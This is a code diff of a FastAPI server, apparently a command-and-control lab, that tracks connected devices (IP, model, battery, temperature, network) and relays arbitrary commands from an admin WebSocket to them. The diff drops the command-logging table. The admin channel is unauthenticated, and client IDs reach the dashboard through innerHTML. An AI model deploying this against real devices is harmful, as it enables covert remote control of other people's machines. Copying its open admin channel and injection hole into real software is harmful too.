@@ -12,12 +12,10 @@ import uvicorn
 app = FastAPI()
 
 DB = "c2_lab.db"
-
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
 PING_INTERVAL = 14 * 60
 
 
-# ---------- База данных ----------
 def init_db():
     con = sqlite3.connect(DB)
     cur = con.cursor()
@@ -26,17 +24,11 @@ def init_db():
             id TEXT PRIMARY KEY,
             ip TEXT,
             last_seen TEXT,
-            status TEXT
-        )
-    """)
-    cur.execute("""
-        CREATE TABLE IF NOT EXISTS commands (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            client_id TEXT,
-            command TEXT,
-            arg TEXT,
-            created_at TEXT,
-            delivered INTEGER DEFAULT 0
+            status TEXT,
+            model TEXT,
+            battery INTEGER,
+            temp REAL,
+            net TEXT
         )
     """)
     con.commit()
@@ -46,7 +38,6 @@ def init_db():
 init_db()
 
 
-# ---------- Менеджер подключений ----------
 class Manager:
     def __init__(self):
         self.clients = {}
@@ -55,20 +46,17 @@ class Manager:
     async def connect_client(self, client_id, ws, ip):
         self.clients[client_id] = ws
         self.update_client(client_id, ip, status="online")
-        # Удаляем другие устройства с тем же IP, кроме текущего
         self.cleanup_old_clients(ip, client_id)
 
     def cleanup_old_clients(self, ip, keep_id):
-        """Удаляет все записи с этим IP, кроме keep_id."""
         try:
             con = sqlite3.connect(DB)
             cur = con.cursor()
             cur.execute("DELETE FROM clients WHERE ip=? AND id!=?", (ip, keep_id))
             con.commit()
             con.close()
-            print(f"Удалены старые устройства с IP {ip}")
         except Exception as e:
-            print(f"cleanup_old_clients error: {e}")
+            print(f"cleanup error: {e}")
 
     async def connect_admin(self, ws):
         self.admins.add(ws)
@@ -80,26 +68,35 @@ class Manager:
     def disconnect_admin(self, ws):
         self.admins.discard(ws)
 
-    def update_client(self, client_id, ip=None, status=None):
+    def update_client(self, client_id, ip=None, status=None, extra=None):
         con = sqlite3.connect(DB)
         cur = con.cursor()
         cur.execute("SELECT id FROM clients WHERE id=?", (client_id,))
-        if cur.fetchone() is None:
+        exists = cur.fetchone() is not None
+        e = extra or {}
+        if not exists:
             cur.execute(
-                "INSERT INTO clients (id, ip, last_seen, status) VALUES (?,?,?,?)",
-                (client_id, ip, datetime.now().isoformat(), status or "unknown"),
-            )
+                "INSERT INTO clients (id, ip, last_seen, status, model, battery, temp, net) "
+                "VALUES (?,?,?,?,?,?,?,?)",
+                (client_id, ip, datetime.now().isoformat(), status or "unknown",
+                 e.get("model", ""), e.get("battery", 0),
+                 e.get("temp", 0), e.get("net", "")))
         else:
-            if ip:
+            if extra:
+                cur.execute(
+                    "UPDATE clients SET ip=COALESCE(?,ip), last_seen=?, status=?, "
+                    "model=?, battery=?, temp=?, net=? WHERE id=?",
+                    (ip, datetime.now().isoformat(), status or "online",
+                     e.get("model", ""), e.get("battery", 0),
+                     e.get("temp", 0), e.get("net", ""), client_id))
+            elif ip:
                 cur.execute(
                     "UPDATE clients SET ip=?, last_seen=?, status=? WHERE id=?",
-                    (ip, datetime.now().isoformat(), status or "online", client_id),
-                )
+                    (ip, datetime.now().isoformat(), status or "online", client_id))
             else:
                 cur.execute(
                     "UPDATE clients SET last_seen=?, status=? WHERE id=?",
-                    (datetime.now().isoformat(), status or "online", client_id),
-                )
+                    (datetime.now().isoformat(), status or "online", client_id))
         con.commit()
         con.close()
 
@@ -123,7 +120,7 @@ class Manager:
     def list_clients(self):
         con = sqlite3.connect(DB)
         cur = con.cursor()
-        cur.execute("SELECT id, ip, last_seen, status FROM clients")
+        cur.execute("SELECT id, ip, last_seen, status, model, battery, temp, net FROM clients")
         rows = cur.fetchall()
         con.close()
         return rows
@@ -132,21 +129,19 @@ class Manager:
 manager = Manager()
 
 
-# ---------- Self-ping для Render ----------
 async def self_ping():
     if not RENDER_URL:
-        print("RENDER_EXTERNAL_URL не задан — self-ping отключён")
         return
     ping_url = RENDER_URL.rstrip("/") + "/health"
-    print(f"Self-ping запущен: {ping_url} каждые {PING_INTERVAL} сек")
+    print(f"Self-ping: {ping_url}")
     async with httpx.AsyncClient() as client:
         while True:
             try:
                 await asyncio.sleep(PING_INTERVAL)
                 r = await client.get(ping_url, timeout=10)
-                print(f"Self-ping OK: {r.status_code} в {datetime.now().isoformat()}")
+                print(f"Self-ping OK: {r.status_code}")
             except Exception as e:
-                print(f"Self-ping ошибка: {e}")
+                print(f"Self-ping err: {e}")
 
 
 @app.on_event("startup")
@@ -159,19 +154,14 @@ async def health():
     return {"ok": True, "time": int(datetime.now().timestamp() * 1000)}
 
 
-# ---------- WebSocket: клиент ----------
 @app.websocket("/ws/client/{client_id}")
 async def client_ws(ws: WebSocket, client_id: str):
     await ws.accept()
     ip = ws.client.host if ws.client else "unknown"
     await manager.connect_client(client_id, ws, ip)
-
     await manager.broadcast_to_admins({
-        "type": "client_connected",
-        "client_id": client_id,
-        "ip": ip,
+        "type": "client_connected", "client_id": client_id, "ip": ip,
     })
-
     try:
         while True:
             text = await ws.receive_text()
@@ -180,33 +170,40 @@ async def client_ws(ws: WebSocket, client_id: str):
             except Exception:
                 msg = {"raw": text}
 
+            if msg.get("type") == "hello":
+                manager.update_client(
+                    client_id, ip=ip, status="online",
+                    extra={
+                        "model": msg.get("model", ""),
+                        "battery": msg.get("battery", 0),
+                        "temp": msg.get("temp", 0),
+                        "net": msg.get("net", ""),
+                    })
+                await manager.broadcast_to_admins({
+                    "type": "client_updated",
+                    "client_id": client_id,
+                    "info": msg,
+                })
+
             msg["client_id"] = client_id
             msg["ts"] = datetime.now().isoformat()
-
             await manager.broadcast_to_admins({
-                "type": "client_message",
-                "payload": msg,
+                "type": "client_message", "payload": msg,
             })
     except WebSocketDisconnect:
         manager.disconnect_client(client_id)
         await manager.broadcast_to_admins({
-            "type": "client_disconnected",
-            "client_id": client_id,
+            "type": "client_disconnected", "client_id": client_id,
         })
 
 
-# ---------- WebSocket: админка ----------
 @app.websocket("/ws/admin")
 async def admin_ws(ws: WebSocket):
     await ws.accept()
     await manager.connect_admin(ws)
-
-    # Отправляем текущий список клиентов
     await ws.send_text(json.dumps({
-        "type": "clients_list",
-        "clients": manager.list_clients(),
+        "type": "clients_list", "clients": manager.list_clients(),
     }))
-
     try:
         while True:
             text = await ws.receive_text()
@@ -214,83 +211,42 @@ async def admin_ws(ws: WebSocket):
                 msg = json.loads(text)
             except Exception:
                 continue
-
             if msg.get("type") == "command":
                 client_id = msg.get("client_id")
                 command = msg.get("command")
                 arg = msg.get("arg", "")
-
-                con = sqlite3.connect(DB)
-                cur = con.cursor()
-                cur.execute(
-                    "INSERT INTO commands (client_id, command, arg, created_at) "
-                    "VALUES (?,?,?,?)",
-                    (client_id, command, arg, datetime.now().isoformat()),
-                )
-                con.commit()
-                con.close()
-
                 delivered = await manager.send_to_client(client_id, {
-                    "type": "command",
-                    "command": command,
-                    "arg": arg,
+                    "type": "command", "command": command, "arg": arg,
                 })
-
                 await ws.send_text(json.dumps({
                     "type": "command_result",
                     "client_id": client_id,
                     "command": command,
-                    "arg": arg,
+                    "arg": arg[:100],
                     "delivered": delivered,
                 }))
     except WebSocketDisconnect:
         manager.disconnect_admin(ws)
 
 
-# ---------- Корень ----------
 @app.get("/", response_class=HTMLResponse)
 async def index():
-    return """
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-<meta charset="utf-8">
-<title>saim Server</title>
-<style>
-body { background:#2A2A2A; color:#fff; font-family: monospace; padding:20px; }
-table { border-collapse: collapse; width:100%; }
-td, th { border:1px solid #555; padding:8px; }
-h1 { color:#fff; }
-</style>
-</head>
-<body>
-<h1>saim Server — ONLINE</h1>
-<p>Сервер работает. Self-ping активен каждые 14 минут.</p>
-<h2>Клиенты</h2>
-<table id="clients">
-<tr><th>ID</th><th>IP</th><th>Last seen</th><th>Status</th></tr>
-</table>
+    return """<!DOCTYPE html><html><head><meta charset="utf-8"><title>saim Server</title>
+<style>body{background:#2A2A2A;color:#fff;font-family:monospace;padding:20px}
+table{border-collapse:collapse;width:100%}td,th{border:1px solid #555;padding:8px}</style>
+</head><body><h1>saim Server — ONLINE</h1>
+<table id="c"><tr><th>ID</th><th>IP</th><th>Last</th><th>Status</th><th>Model</th><th>Bat</th><th>Temp</th><th>Net</th></tr></table>
 <script>
-const ws = new WebSocket("wss://" + location.host + "/ws/admin");
-const table = document.getElementById("clients");
-ws.onmessage = (e) => {
-    const msg = JSON.parse(e.data);
-    if (msg.type === "clients_list") {
-        table.innerHTML = "<tr><th>ID</th><th>IP</th><th>Last seen</th><th>Status</th></tr>";
-        for (const c of msg.clients) {
-            const tr = document.createElement("tr");
-            tr.innerHTML = `<td>${c[0]}</td><td>${c[1]||""}</td><td>${c[2]||""}</td><td>${c[3]||""}</td>`;
-            table.appendChild(tr);
-        }
-    }
-};
-</script>
-</body>
-</html>
-"""
+const ws=new WebSocket("wss://"+location.host+"/ws/admin");
+const t=document.getElementById("c");
+ws.onmessage=(e)=>{const m=JSON.parse(e.data);
+if(m.type==="clients_list"){t.innerHTML="<tr><th>ID</th><th>IP</th><th>Last</th><th>Status</th><th>Model</th><th>Bat</th><th>Temp</th><th>Net</th></tr>";
+for(const c of m.clients){const tr=document.createElement("tr");
+tr.innerHTML=`<td>${c[0]}</td><td>${c[1]||""}</td><td>${c[2]||""}</td><td>${c[3]||""}</td><td>${c[4]||""}</td><td>${c[5]||""}</td><td>${c[6]||""}</td><td>${c[7]||""}</td>`;
+t.appendChild(tr);}}};
+</script></body></html>"""
 
 
-# ---------- Запуск ----------
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
     uvicorn.run(app, host="0.0.0.0", port=port)
